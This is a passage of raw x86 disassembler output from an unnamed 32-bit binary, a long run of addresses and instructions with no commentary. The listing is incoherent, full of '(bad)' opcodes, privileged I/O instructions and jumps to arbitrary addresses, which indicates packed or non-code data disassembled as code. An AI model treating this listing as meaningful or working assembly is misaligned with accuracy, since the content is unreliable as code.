  417966:	and    ah,0x35
  417969:	push   esi
  41796a:	xchg   edx,eax
  41796b:	cdq    
  41796c:	jns    0x417918
  41796e:	dec    esi
  41796f:	jbe    0x41799e
  417971:	jp     0x417928
  417973:	(bad)  
  417974:	sub    al,0x28
  417976:	sbb    ebx,ebp
  417978:	sbb    BYTE PTR [eax+0x639080b],ch
  41797e:	pop    eax
  41797f:	call   0xf98956b0
  417984:	fcmovnb st,st(0)
  417986:	pop    edi
  417987:	pop    ss
  417988:	test   DWORD PTR [ecx+0x34],0xec661229
  41798f:	mov    al,ds:0xac1d002d
  417994:	iret   
  417995:	adc    BYTE PTR [edi-0x22],bh
  417998:	add    ah,ah
  41799a:	imul   edx,DWORD PTR ds:0xc9505d8c,0xddd5b956
  4179a4:	pop    esi
  4179a5:	adc    dh,dl
  4179a7:	xor    bh,BYTE PTR [edi+0x39dc7e5f]
  4179ad:	and    cl,BYTE PTR [eax]
  4179af:	mov    al,0x7b
  4179b1:	pop    es
  4179b2:	jmp    0x4179ed
  4179b4:	je     0x4179d2
  4179b6:	les    eax,FWORD PTR [edi+0x4689194]
  4179bc:	inc    ebp
  4179bd:	adc    al,0xb1
  4179bf:	mov    ebp,0xf6021719
  4179c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179c5:	test   DWORD PTR [ebx-0x4e63e563],esi
  4179cb:	neg    esp
  4179cd:	add    al,0x91
  4179cf:	fnstcw WORD PTR [esi-0x4d]
  4179d2:	jae    0x4179a1
  4179d4:	rol    cl,0x16
  4179d7:	jmp    0x417a2b
  4179d9:	ss pop eax
  4179db:	ret    
  4179dc:	sub    edi,ecx
  4179de:	sub    dl,dl
  4179e0:	mov    eax,DWORD PTR ds:0xe20e7160
  4179e6:	adc    eax,0x8b442bd5
  4179eb:	cli    
  4179ec:	jecxz  0x4179ef
  4179ee:	mov    bh,0xd1
  4179f0:	xor    BYTE PTR [eax+0x54723ff1],ah
  4179f6:	cwde   
  4179f7:	scas   eax,DWORD PTR es:[edi]
  4179f8:	push   ebx
  4179f9:	jo     0x4179e2
  4179fb:	sub    bl,BYTE PTR [eax+0xc03ae10]
  417a01:	adc    al,BYTE PTR [edi+ecx*4+0x4c658db]
  417a08:	xchg   esp,eax
  417a09:	dec    ebx
  417a0a:	fbstp  TBYTE PTR [esi]
  417a0c:	mov    WORD PTR [eax+0x1d],es
  417a0f:	in     eax,0xb
  417a11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a12:	icebp  
  417a13:	cmp    dl,ch
  417a15:	imul   edx,DWORD PTR [edx-0x77f17204],0x37
  417a1c:	pop    ss
  417a1d:	ret    0xa2cd
  417a20:	in     al,dx
  417a21:	push   es
  417a22:	shl    esp,0xf6
  417a25:	mov    dl,0x26
  417a27:	icebp  
  417a28:	bound  edi,QWORD PTR [di-0x58f5]
  417a2d:	sbb    ah,bl
  417a2f:	repnz popa 
  417a31:	mov    bl,0x25
  417a33:	push   edi
  417a34:	jge    0x417a05
  417a36:	mov    eax,0x6569880f
  417a3b:	mov    esi,0xaaf59061
  417a40:	arpl   WORD PTR [eax+0x35a24a10],sp
  417a46:	stos   BYTE PTR es:[edi],al
  417a47:	jae    0x417a45
  417a49:	mov    ah,0x2e
  417a4b:	mov    ss,WORD PTR [eax-0xa9824ae]
  417a51:	cmp    al,dh
  417a53:	sub    ebx,DWORD PTR [edx-0x42]
  417a56:	sar    DWORD PTR [edx],0x49
  417a59:	mov    eax,0x593c282a
  417a5e:	pushf  
  417a5f:	cmc    
  417a60:	inc    esp
  417a61:	and    esp,DWORD PTR [esp+eiz*8+0x71]
  417a65:	fist   DWORD PTR [ecx+0x27]
  417a68:	adc    ebx,0x26fd0c8e
  417a6e:	push   ebx
  417a6f:	dec    edx
  417a70:	fsubr  DWORD PTR [edi-0x41d511f3]
  417a76:	push   cs
  417a77:	(bad)  
  417a78:	mov    ds:0x37a9d89e,al
  417a7d:	cld    
  417a7e:	cmp    eax,0xfec05c3e
  417a83:	mov    al,ds:0x52366509
  417a88:	push   0x76dfe26b
  417a8d:	inc    eax
  417a8e:	or     DWORD PTR [esi+0x69b52f2b],eax
  417a94:	mov    dl,0x4b
  417a96:	mov    bl,0x80
  417a98:	inc    eax
  417a99:	mov    bh,0x99
  417a9b:	outs   dx,DWORD PTR ds:[esi]
  417a9c:	and    BYTE PTR [edx-0x8622ab1],cl
  417aa2:	mov    ss,ebx
  417aa4:	mov    DWORD PTR [ebp-0x5fd68530],ebx
  417aaa:	sbb    cl,ch
  417aac:	loop   0x417a67
  417aae:	dec    esi
  417aaf:	outs   dx,BYTE PTR ds:[esi]
  417ab0:	ret    0x55e1
  417ab3:	ror    DWORD PTR [edi-0x7a],cl
  417ab6:	mov    al,ds:0x28803343
  417abb:	mov    esp,0xefc80b00
  417ac0:	aam    0xb6
  417ac2:	sub    al,0x0
  417ac4:	nop
  417ac5:	mov    bh,0x22
  417ac7:	shl    edi,cl
  417ac9:	sahf   
  417aca:	pushf  
  417acb:	mov    ecx,0x35b2c320
  417ad0:	and    DWORD PTR [esi],esp
  417ad2:	imul   ebx,DWORD PTR [edx+eiz*2+0x5ccbf2eb],0x4cc59714
  417add:	leave  
  417ade:	xchg   esp,eax
  417adf:	inc    ebp
  417ae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ae1:	dec    esp
  417ae2:	inc    esi
  417ae3:	push   es
  417ae4:	adc    DWORD PTR [edx-0x5d201af6],0x8fa664ad
  417aee:	dec    ebx
  417aef:	dec    ebx
  417af0:	push   ds
  417af1:	jmp    0x4c3:0xe0b46229
  417af8:	loopne 0x417aec
  417afa:	or     DWORD PTR [esi+0x25],ebx
  417afd:	mov    esi,0x15347c0f
  417b02:	sbb    edi,DWORD PTR [ecx]
  417b04:	iret   
  417b05:	ds in  eax,dx
  417b07:	jno    0x417acb
  417b09:	scas   eax,DWORD PTR es:[edi]
  417b0a:	sbb    eax,0x43ca61ae
  417b0f:	mov    ecx,0x423d0fde
  417b14:	js     0x417b2b
  417b16:	dec    esp
  417b17:	lods   al,BYTE PTR ds:[esi]
  417b18:	pop    ecx
  417b19:	iret   
  417b1a:	(bad)  
  417b1b:	std    
  417b1c:	mov    ch,0x86
  417b1e:	pop    eax
  417b1f:	sar    BYTE PTR [ebp-0x1d],cl
  417b22:	sub    dl,BYTE PTR [edx]
  417b24:	(bad)  
  417b25:	sbb    DWORD PTR [ebx+0x5f29e264],esp
  417b2b:	pop    ebp
  417b2c:	mov    esp,edi
  417b2e:	push   edx
  417b2f:	call   0x7022:0x452f67f6
  417b36:	(bad)  
  417b37:	fdivr  QWORD PTR [edi-0x5e]
  417b3a:	and    eax,DWORD PTR [ebp+0x54906c60]
  417b40:	cld    
  417b41:	mov    edx,0xe70a040a
  417b46:	mov    cl,0x4f
  417b48:	shl    al,0x1f
  417b4b:	add    DWORD PTR [esi-0x755a7037],ecx
  417b51:	fwait
  417b52:	out    dx,al
  417b53:	xchg   edi,eax
  417b55:	sbb    ecx,DWORD PTR [esi-0x854da61]
  417b5b:	pop    esi
  417b5c:	dec    edx
  417b5d:	test   eax,0xd3faac24
  417b62:	xchg   ecx,eax
  417b63:	sbb    al,0x2
  417b65:	jecxz  0x417aea
  417b67:	out    0xde,eax
  417b69:	push   ecx
  417b6a:	pop    ebx
  417b6b:	pop    ecx
  417b6c:	iret   
  417b6d:	mov    DWORD PTR [esi+esi*2-0x11],esi
  417b71:	cdq    
  417b72:	jmp    ecx
  417b74:	add    al,0x88
  417b76:	lods   al,BYTE PTR ds:[esi]
  417b77:	jne    0x417bb4
  417b79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b7a:	mov    eax,ds:0xb55778d4
  417b7f:	ror    DWORD PTR [edi],1
  417b81:	stos   BYTE PTR es:[edi],al
  417b82:	sub    edx,DWORD PTR [edi+edi*8-0x1918d9a7]
  417b89:	aam    0x47
  417b8b:	jbe    0x417bda
  417b8d:	dec    edx
  417b8e:	push   ecx
  417b8f:	cdq    
  417b90:	stos   DWORD PTR es:[edi],eax
  417b91:	mov    eax,ds:0xcf7ebe53
  417b96:	loop   0x417bed
  417b98:	and    dh,0xe0
  417b9b:	adc    BYTE PTR [edi],dl
  417b9d:	mov    bl,0xb0
  417b9f:	mov    ds:0xb817ee61,eax
  417ba4:	adc    eax,0x6909506c
  417ba9:	mov    ds:0xabf39db7,eax
  417bae:	push   esp
  417baf:	mov    cl,0xb3
  417bb1:	adc    eax,0x4142cbb
  417bb6:	mov    DWORD PTR [ecx+0x1f],ecx
  417bb9:	jecxz  0x417b50
  417bbb:	xor    al,0x66
  417bbd:	mov    eax,ds:0xa546ce0
  417bc2:	push   edx
  417bc3:	add    DWORD PTR [ecx+0x43],edx
  417bc6:	cmp    DWORD PTR [esi-0x7a],ecx
  417bc9:	jnp    0x417bf3
  417bcb:	and    al,0xcc
  417bcd:	sbb    DWORD PTR [ebx],edi
  417bcf:	and    BYTE PTR [ebp+0x64],0xc5
  417bd3:	push   cs
  417bd4:	mov    cl,0x9e
  417bd6:	push   ds
  417bd7:	test   eax,0xc6d666f7
  417bdc:	mov    ds:0xcb6bd3ef,al
  417be1:	nop
  417be2:	and    edx,DWORD PTR [ecx]
  417be4:	lods   al,BYTE PTR ds:[esi]
  417be5:	inc    esp
  417be6:	or     dh,BYTE PTR [ebp+0x6c]
  417be9:	jle    0x417c5a
  417beb:	dec    esi
  417bec:	sbb    DWORD PTR [ecx+0x55d5096e],esi
  417bf2:	sbb    BYTE PTR [eax],bl
  417bf4:	pop    es
  417bf5:	push   esp
  417bf6:	or     BYTE PTR [ebp-0x6ed69699],0x93
  417bfd:	dec    BYTE PTR [ebx]
  417bff:	mov    dl,0x9
  417c01:	lods   al,BYTE PTR ds:[esi]
  417c02:	mov    al,0x33
  417c04:	xlat   BYTE PTR ds:[ebx]
  417c05:	cmp    eax,0xa12a29b8
  417c0a:	mov    ebp,0x3fea6d0d
  417c0f:	scas   eax,DWORD PTR es:[edi]
  417c10:	push   eax
  417c11:	inc    ebp
  417c12:	je     0x417c47
  417c14:	arpl   WORD PTR [esi+0x1666b021],cx
  417c1a:	xor    eax,0x36825c0
  417c1f:	scas   eax,DWORD PTR es:[edi]
  417c20:	mov    al,ds:0xde2b8ef6
  417c25:	mov    bl,BYTE PTR [ecx]
  417c27:	sbb    cl,BYTE PTR [ebx-0x737ece1a]
  417c2d:	fsubr  QWORD PTR [ecx]
  417c2f:	or     ch,dl
  417c31:	fdiv   DWORD PTR [edi-0x667c5318]
  417c37:	not    BYTE PTR [esi-0x1514716d]
  417c3d:	cmp    cl,BYTE PTR [ebx]
  417c3f:	out    0x2c,al
  417c41:	sub    cl,cl
  417c43:	or     eax,0x35cbc651
  417c48:	and    DWORD PTR [ebx],ebp
  417c4a:	mov    cl,0xda
  417c4c:	into   
  417c4d:	jecxz  0x417c42
  417c4f:	or     BYTE PTR [ebp-0x3e],bh
  417c52:	cs pop ebx
  417c54:	adc    eax,0x2aeaab51
  417c59:	lahf   
  417c5a:	jge    0x417c1e
  417c5c:	bound  edi,QWORD PTR [esi]
  417c5e:	cmp    al,0xf5
  417c60:	adc    eax,0xaad0db3
  417c65:	in     eax,0xb
  417c67:	push   esp
  417c68:	ds inc ebp
  417c6a:	mov    WORD PTR [ecx-0x35],ds
  417c6d:	mov    ds:0x1e643f53,al
  417c72:	loope  0x417ca1
  417c74:	in     eax,dx
  417c75:	jne    0x417c2e
  417c77:	outs   dx,DWORD PTR ds:[esi]
  417c78:	pop    edx
  417c79:	jl     0x417c2e
  417c7b:	(bad)  
  417c7c:	adc    bh,bl
  417c7e:	stos   BYTE PTR es:[edi],al
  417c7f:	jmp    0x7ea43613
  417c84:	call   0x773d:0x927f7d2f
  417c8b:	(bad)  
  417c8c:	call   0xb110:0x533b956b
  417c93:	xchg   esi,eax
  417c94:	dec    eax
  417c95:	fisub  WORD PTR [edx]
  417c97:	mov    esp,0x3c50e5ba
  417c9c:	xchg   ecx,eax
  417c9d:	dec    edx
  417c9e:	std    
  417c9f:	and    eax,0x70fe821f
  417ca4:	adc    BYTE PTR [eax+0x6e1b6653],0x20
  417cab:	out    dx,al
  417cac:	jecxz  0x417d13
  417cae:	loope  0x417c7a
  417cb0:	and    al,0x5a
  417cb2:	in     ax,dx
  417cb4:	push   edx
  417cb5:	adc    esp,edi
  417cb7:	(bad)  
  417cb9:	add    DWORD PTR [ebp+0x2a061029],edi
  417cbf:	pusha  
  417cc0:	jno    0x417cd8
  417cc2:	es lock dec esp
  417cc5:	cwde   
  417cc6:	inc    edi
  417cc7:	xchg   ebx,eax
  417cc8:	pop    ebx
  417cc9:	daa    
  417cca:	or     al,0x69
  417ccc:	and    bh,al
  417cce:	call   0x6f9197e8
  417cd3:	clc    
  417cd4:	inc    eax
  417cd5:	push   edx
  417cd6:	or     esp,DWORD PTR [ecx+0x7cb51db]
  417cdc:	pushf  
  417cdd:	xchg   DWORD PTR [ecx-0x5f],eax
  417ce0:	je     0x417d38
  417ce2:	pop    edi
  417ce3:	cdq    
  417ce4:	cmp    DWORD PTR [ecx],esi
  417ce6:	push   ebp
  417ce7:	sbb    ah,BYTE PTR [esi+edi*2+0x5c]
  417ceb:	pop    edi
  417cec:	aam    0x56
  417cee:	mov    esp,0xeaa99104
  417cf3:	add    esi,DWORD PTR [edi-0x4a]
  417cf6:	mov    esi,0x1e8b4b0a
  417cfb:	outs   dx,DWORD PTR ds:[esi]
  417cfc:	das    
  417cfd:	inc    edx
  417cfe:	in     eax,0x98
  417d00:	test   BYTE PTR [ebx-0x9],ah
  417d03:	push   0x84a19adf
  417d08:	lods   al,BYTE PTR ds:[esi]
  417d09:	into   
  417d0a:	pop    ds
  417d0b:	inc    esi
  417d0c:	sub    dh,bh
  417d0e:	add    eax,0x8bbbfc99
  417d13:	or     eax,0x83fc74b
  417d18:	jmp    0x4535:0xdd29094e
  417d1f:	push   ebp
  417d20:	ja     0x417d3d
  417d22:	test   DWORD PTR [ebx+edx*8+0x7e],edx
  417d26:	sbb    eax,DWORD PTR [edi]
  417d28:	sar    DWORD PTR [edi+0x25],0x4
  417d2c:	mov    esp,0xb54ee950
  417d31:	mov    cl,0xc6
  417d33:	cmp    eax,0x6f0ce1b6
  417d38:	mov    dh,0x91
  417d3a:	xor    eax,0x9c7802a5
  417d3f:	ss inc esi
  417d41:	mov    esi,0x9f891692
  417d46:	fisttp WORD PTR ds:0xee5e3c0f
  417d4c:	push   cs
  417d4d:	mov    eax,ds:0xacaf3aa2
  417d52:	jno    0x417ced
  417d54:	aam    0xe7
  417d56:	sub    eax,0x712b546c
  417d5b:	mov    BYTE PTR [edi],bh
  417d5d:	mov    al,ds:0x6fdce3ad
  417d62:	dec    ecx
  417d63:	jb     0x417dd8
  417d65:	mov    edx,0xc8d67e71
  417d6a:	cmp    edx,DWORD PTR [ecx+edi*2-0x7b6ea62]
  417d71:	stos   DWORD PTR es:[edi],eax
  417d72:	jnp    0x417da1
  417d74:	or     esp,DWORD PTR [ebx+0x5f7c09d9]
  417d7a:	mov    ds:0x60ef9aee,eax
  417d7f:	pop    edx
  417d80:	jle    0x417d04
  417d82:	mov    edx,0xbd89f60d
  417d87:	idiv   ch
  417d89:	test   al,0x14
  417d8b:	popf   
  417d8c:	sti    
  417d8d:	arpl   cx,bx
  417d8f:	repnz xchg esi,eax
  417d91:	jo     0x417daf
  417d93:	out    dx,eax
  417d94:	jbe    0x417d30
  417d96:	dec    ecx
  417d97:	loop   0x417d40
  417d99:	in     al,dx
  417d9a:	mov    ah,0x4f
  417d9c:	outs   dx,BYTE PTR ds:[si]
  417d9e:	xor    dh,BYTE PTR ds:0xe77cfa88
  417da4:	out    0x58,al
  417da6:	fld    DWORD PTR [esi+0x45]
  417da9:	into   
  417daa:	lods   al,BYTE PTR ds:[esi]
  417dab:	(bad)  
  417dac:	fucom  st(1)
  417dae:	push   ebx
  417daf:	push   ss
  417db0:	cmp    BYTE PTR [ebx+0x533bfc26],0x20
  417db7:	test   eax,0xc2dedf5d
  417dbc:	out    dx,eax
  417dbd:	mov    edi,0x76380bfc
  417dc2:	pop    esi
  417dc3:	cmp    BYTE PTR [ebx+ecx*4-0x249af04d],bl
  417dca:	ins    BYTE PTR es:[edi],dx
  417dcb:	daa    
  417dcc:	mov    ch,0x25
  417dce:	lods   eax,DWORD PTR ds:[esi]
  417dcf:	cmp    dl,ch
  417dd1:	dec    BYTE PTR [ecx-0x2]
  417dd4:	mov    edi,0x5ba02d44
  417dd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dda:	jmp    FWORD PTR [edx]
  417ddc:	shl    DWORD PTR [ecx-0x54149001],0x85
  417de3:	in     eax,0xed
  417de5:	sub    DWORD PTR [esi],0x552f83f0
  417deb:	popf   
  417dec:	retf   0xd4d5
  417def:	cmp    DWORD PTR [esi],ebx
  417df1:	mov    ah,0x31
  417df3:	inc    ebx
  417df4:	adc    bh,BYTE PTR [esi+0x6f]
  417df7:	data16 test BYTE PTR [ebx+0x10ad5f4c],bh
  417dfe:	pop    es
  417dff:	pushf  
  417e00:	or     BYTE PTR [edi-0x10],0xb8
  417e04:	mov    al,ds:0x2a328ba8
  417e09:	in     eax,dx
  417e0a:	push   edi
  417e0b:	xor    eax,0xc4d6de3b
  417e10:	sbb    cl,BYTE PTR [esi-0x68637c4b]
  417e16:	mov    edi,DWORD PTR [edx]
  417e18:	ins    BYTE PTR es:[edi],dx
  417e19:	gs xchg edi,eax
  417e1b:	shr    DWORD PTR [edx],1
  417e1d:	test   DWORD PTR [ebx],esi
  417e1f:	arpl   WORD PTR [edx-0x22a6d3b5],bx
  417e25:	push   DWORD PTR [ecx]
  417e27:	je     0x417dce
  417e29:	fisttp DWORD PTR [ebx]
  417e2b:	ja     0x417dcf
  417e2d:	int3   
  417e2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e2f:	loope  0x417dc3
  417e31:	and    ebp,DWORD PTR [ebx-0x7c]
  417e34:	mov    bh,0xc7
  417e36:	sub    dl,BYTE PTR [ecx-0x5f49e5de]
  417e3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e3d:	adc    ah,BYTE PTR [ecx-0x3b]
  417e40:	xchg   ebx,eax
  417e41:	stos   DWORD PTR es:[edi],eax
  417e42:	fs inc edi
  417e44:	jb     0x417df7
  417e46:	or     edi,DWORD PTR [edx-0x251ac319]
  417e4c:	enter  0xc0c8,0x2f
  417e50:	mov    dh,0xb6
  417e52:	js     0x417e1b
  417e54:	in     al,dx
  417e55:	xchg   edi,eax
  417e56:	adc    esi,DWORD PTR [eax-0x11]
  417e59:	mov    edx,0xc713324d
  417e5e:	test   BYTE PTR [eax-0x34098ee3],0xe1
  417e65:	fwait
  417e66:	leave  
  417e67:	dec    esp
  417e68:	test   eax,0x3f2e8ec2
  417e6d:	mov    bh,bl
  417e6f:	lock in eax,dx
  417e71:	push   cs
  417e72:	mov    ebp,0x96595589
  417e77:	pop    es
  417e78:	lds    esp,FWORD PTR [ecx+0x23af0ffa]
  417e7e:	mov    cl,0x90
  417e80:	fidivr WORD PTR [ebp+0x4046e725]
  417e86:	fwait
  417e87:	jl     0x417e34
  417e89:	cmp    DWORD PTR [ebp+edi*8+0x33acfce6],0x46
  417e91:	sbb    BYTE PTR [ecx-0x1d685ad5],dl
  417e97:	cmp    eax,DWORD PTR [ebx+edx*4+0x213fdeb3]
  417e9e:	out    dx,al
  417e9f:	arpl   WORD PTR [ebx+0x23],cx
  417ea2:	pop    es
  417ea3:	aas    
  417ea4:	(bad)  
  417ea5:	rep ins DWORD PTR es:[edi],dx
  417ea7:	ds enter 0x4afc,0x47
  417eac:	push   edx
  417ead:	xlat   BYTE PTR ds:[ebx]
  417eae:	jmp    0x8b0e:0xebd8111b
  417eb5:	xor    DWORD PTR [edi+0x4e],edx
  417eb8:	fdivr  DWORD PTR [ebx-0x50d99e59]
  417ebe:	mov    bh,0xbd
  417ec0:	daa    
  417ec1:	popa   
  417ec2:	lods   al,BYTE PTR ds:[esi]
  417ec3:	enter  0xcb97,0x3c
  417ec7:	jno    0x417ea7
  417ec9:	add    al,0x5b
  417ecb:	scas   eax,DWORD PTR es:[edi]
  417ecc:	mov    al,0xc
  417ece:	xor    ebp,DWORD PTR [eax]
  417ed0:	pop    esp
  417ed1:	arpl   WORD PTR [ebp-0x4c],si
  417ed4:	push   0x92fbe3d1
  417ed9:	mov    bl,dl
  417edb:	or     eax,0x8353880f
  417ee0:	scas   eax,DWORD PTR es:[edi]
  417ee1:	fld    DWORD PTR [esi-0x26]
  417ee4:	xlat   BYTE PTR ds:[ebx]
  417ee5:	push   edi
  417ee6:	imul   eax,DWORD PTR [ebp+0x81f3ee6],0x26de39d0
  417ef0:	pop    es
  417ef1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ef2:	push   ds
  417ef3:	mov    ebx,0x5ba7d171
  417ef8:	add    dh,BYTE PTR [ecx]
  417efa:	loope  0x417f07
  417efc:	jae    0x417f6f
  417efe:	icebp  
  417eff:	jle    0x417ece
  417f01:	adc    DWORD PTR [edi],edi
  417f03:	sbb    BYTE PTR [ecx],bl
  417f05:	pop    ebp
  417f06:	cmc    
  417f07:	sbb    al,0x49
  417f09:	js     0x417f41
  417f0b:	push   eax
  417f0c:	aad    0xbb
  417f0e:	stos   DWORD PTR es:[edi],eax
  417f0f:	aam    0x61
  417f11:	lahf   
  417f12:	in     eax,dx
  417f13:	push   0xe42db472
  417f18:	dec    eax
  417f19:	cmp    eax,0x3e00b8b5
  417f1e:	jno    0x417f81
  417f20:	xchg   ebx,eax
  417f21:	out    0xa0,eax
  417f23:	loope  0x417f43
  417f25:	stos   BYTE PTR es:[edi],al
  417f26:	add    eax,0x659bc80c
  417f2b:	dec    esp
  417f2c:	dec    esp
  417f2d:	sbb    edx,DWORD PTR [esi+0x43bd4265]
  417f33:	add    eax,0x7181a801
  417f38:	lahf   
  417f39:	xchg   edx,eax
  417f3a:	fsubr  DWORD PTR [ecx+0x357fee46]
  417f40:	lds    eax,FWORD PTR [ebx-0x7cb2cf74]
  417f46:	adc    dl,BYTE PTR [ebx+0x3c]
  417f49:	pop    esp
  417f4a:	xchg   ebx,eax
  417f4b:	in     eax,0x9a
  417f4d:	test   eax,0x37e3d9e8
  417f52:	hlt    
  417f53:	scas   al,BYTE PTR es:[edi]
  417f54:	je     0x417ee6
  417f56:	lods   al,BYTE PTR ds:[esi]
  417f57:	loop   0x417f19
  417f59:	scas   al,BYTE PTR es:[edi]
  417f5a:	add    al,0x47
  417f5c:	pop    ebx
  417f5d:	es sub ah,al
  417f60:	out    dx,al
  417f61:	mov    al,0xb4
  417f63:	in     eax,dx
  417f64:	ja     0x417fa3
  417f66:	push   es
  417f67:	icebp  
  417f68:	pop    ebx
  417f69:	dec    ecx
  417f6a:	push   cs
  417f6b:	dec    ecx
  417f6c:	pop    ecx
  417f6d:	adc    eax,0xdf4a6f5e
  417f72:	fidivr DWORD PTR [edx+0x1a]
  417f75:	sbb    BYTE PTR [ecx],dh
  417f77:	out    dx,al
  417f78:	das    
  417f79:	(bad)  
  417f7a:	xchg   ebx,eax
  417f7b:	clc    
  417f7c:	fsub   DWORD PTR [edi-0x25]
  417f7f:	mov    ebp,0xfe05b314
  417f84:	mov    dh,0x43
  417f86:	outs   dx,BYTE PTR ds:[esi]
  417f87:	jne    0x417f6e
  417f89:	sbb    ebp,esp
  417f8b:	cld    
  417f8c:	jmp    0x17bcfa12
  417f91:	fcomip st,st(4)
  417f93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f94:	neg    BYTE PTR ds:0xa03d4e3d
  417f9a:	std    
  417f9b:	fstp   DWORD PTR [edx]
  417f9d:	sub    DWORD PTR [ebx],ecx
  417f9f:	mov    cl,0x18
  417fa1:	jle    0x417f38
  417fa3:	fsub   DWORD PTR [edx+0x153a813c]
  417fa9:	xor    eax,DWORD PTR [ebx-0x6a]
  417fac:	ror    BYTE PTR [ebx-0x2e],1
  417faf:	mov    BYTE PTR [edx],al
  417fb1:	dec    edi
  417fb2:	push   es
  417fb3:	inc    ebx
  417fb4:	popa   
  417fb5:	loope  0x417f44
  417fb7:	xchg   edx,eax
  417fb8:	push   0x1ed81479
  417fbd:	bound  eax,QWORD PTR [ebx+edx*8-0x6b76042f]
  417fc4:	mov    esp,esi
  417fc6:	lock stc 
  417fc8:	or     dh,BYTE PTR [ebx]
  417fca:	aaa    
  417fcb:	jno    0x417f85
  417fcd:	sbb    ebp,DWORD PTR [ecx-0x634ff4df]
  417fd3:	pop    es
  417fd4:	outs   dx,DWORD PTR ds:[esi]
  417fd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fd6:	rcl    DWORD PTR [ebp-0xf752baf],cl
  417fdc:	xor    DWORD PTR [edi],0x9643f835
  417fe2:	cmp    BYTE PTR [edi-0x5180f935],0xcf
  417fe9:	and    al,0xab
  417feb:	cmp    eax,0x34ba8d2f
  417ff0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ff1:	or     BYTE PTR [eax+0x3e],ch
  417ff4:	push   eax
  417ff5:	out    0x5e,eax
  417ff7:	test   al,al
  417ff9:	ficomp DWORD PTR [ebx]
  417ffb:	or     BYTE PTR [eax-0x6b],dl
  417ffe:	mov    WORD PTR [ecx+0x27],ds
  418001:	and    ch,cl
  418003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418004:	icebp  
  418005:	mov    dl,cl
  418007:	test   eax,0xacaf18b0
  41800c:	add    al,0x9a
  41800e:	(bad)  
  41800f:	mov    eax,0x57181306
  418014:	jns    0x41808a
  418016:	cwde   
  418017:	mov    esp,0xa9ac5aa8
  41801c:	mov    dh,0x6b
  41801e:	imul   edx,DWORD PTR [eax-0x45144a22],0x43
  418025:	push   eax
  418026:	in     eax,0xf2
  418028:	xchg   edi,eax
  418029:	mov    ds:0x986c0480,eax
  41802e:	pop    esp
  41802f:	dec    edx
  418030:	iret   
  418031:	popf   
  418032:	xor    esi,ebx
  418034:	push   edx
  418035:	(bad)  
  418036:	xor    DWORD PTR [edi-0x3d],esi
  418039:	jmp    0x84fdd3c1
  41803e:	xchg   edx,eax
  41803f:	test   eax,0x3f49e908
  418044:	cdq    
  418045:	push   esp
  418046:	sbb    esp,DWORD PTR [ebx+0x4abae699]
  41804c:	mov    esi,0x1a27cf98
  418051:	mov    edi,0x48bfcf43
  418056:	test   eax,0xa3251f0a
  41805b:	xor    al,BYTE PTR [eiz*2-0x50bebaaf]
  418062:	mov    esp,0xa0c0da10
  418067:	in     al,0x9e
  418069:	or     BYTE PTR [edx+0x2e],ch
  41806c:	icebp  
  41806d:	dec    edi
  41806e:	sti    
  41806f:	push   0x53ea5d6d
  418074:	adc    BYTE PTR [ebx-0x1ddca9e3],ch
  41807a:	mov    ebp,0x5fd8e3e1
  41807f:	push   eax
  418080:	jbe    0x4180da
  418082:	sbb    ah,BYTE PTR [esi+0xf]
  418085:	int3   
  418086:	lahf   
  418087:	dec    esp
  418088:	mov    al,ds:0x99e4962e
  41808d:	fild   QWORD PTR [esi+0x41]
  418090:	(bad)  
  418091:	cli    
  418092:	mov    al,0x26
  418094:	retf   
  418095:	xor    eax,0x5d847168
  41809a:	lock pop ecx
  41809c:	pop    ds
  41809d:	ins    BYTE PTR es:[edi],dx
  41809e:	out    0x3d,eax
  4180a0:	jecxz  0x418103
  4180a2:	dec    esp
  4180a3:	icebp  
  4180a4:	sbb    edi,DWORD PTR [edi]
  4180a6:	push   edi
  4180a7:	mov    eax,ds:0x62cda6a7
  4180ac:	scas   al,BYTE PTR es:[edi]
  4180ad:	scas   eax,DWORD PTR es:[edi]
  4180ae:	retf   
  4180af:	mov    eax,0x26fbdb83
  4180b4:	xchg   edi,eax
  4180b5:	aas    
  4180b6:	lods   al,BYTE PTR ds:[esi]
  4180b7:	retf   0xf5ed
  4180ba:	add    ecx,DWORD PTR [edi+0x2e]
  4180bd:	mov    DWORD PTR [ebx],ebx
  4180bf:	and    bl,BYTE PTR [edi-0x514f6855]
  4180c5:	dec    edx
  4180c6:	cmp    eax,0x344e5f09
  4180cb:	es jmp 0x9735b54d
  4180d1:	stos   DWORD PTR es:[edi],eax
  4180d2:	sahf   
  4180d3:	xlat   BYTE PTR ds:[ebx]
  4180d4:	out    0x43,al
  4180d6:	leave  
  4180d7:	scas   eax,DWORD PTR es:[edi]
  4180d8:	cmp    al,0xcb
  4180da:	and    eax,0x1d08ccb
  4180df:	mov    ds:0xcb69b229,eax
  4180e4:	jae    0x4180a0
  4180e6:	cmp    eax,0xacd43feb
  4180eb:	and    cl,BYTE PTR [esp+eiz*4+0x59b0655e]
  4180f2:	sbb    bp,WORD PTR [esi]
  4180f5:	or     ah,BYTE PTR [eax]
  4180f7:	js     0x4180dd
  4180f9:	sub    al,0x72
  4180fb:	jecxz  0x4180b8
  4180fd:	push   esi
  4180fe:	push   0xbb5f4fa1
  418103:	cld    
  418104:	jb     0x418137
  418106:	and    esp,edx
  418108:	aad    0x4a
  41810a:	adc    al,0xc9
  41810c:	cmc    
  41810d:	jecxz  0x418094
  41810f:	cwde   
  418110:	jnp    0xbd8759a7
  418116:	mov    al,0xf1
  418118:	loopne 0x418124
  41811a:	sahf   
  41811b:	scas   eax,DWORD PTR es:[edi]
  41811c:	mov    ds:0x61be0e1f,al
  418121:	sbb    DWORD PTR [ebx+0x3225ee27],0x3b4ea489
  41812b:	imul   edi,DWORD PTR ds:0xe29dee2f,0x18f41932
  418135:	inc    ebp
  418136:	mov    dh,0x55
  418138:	arpl   WORD PTR [ebp+ebx*4+0x1b],di
  41813c:	dec    ebx
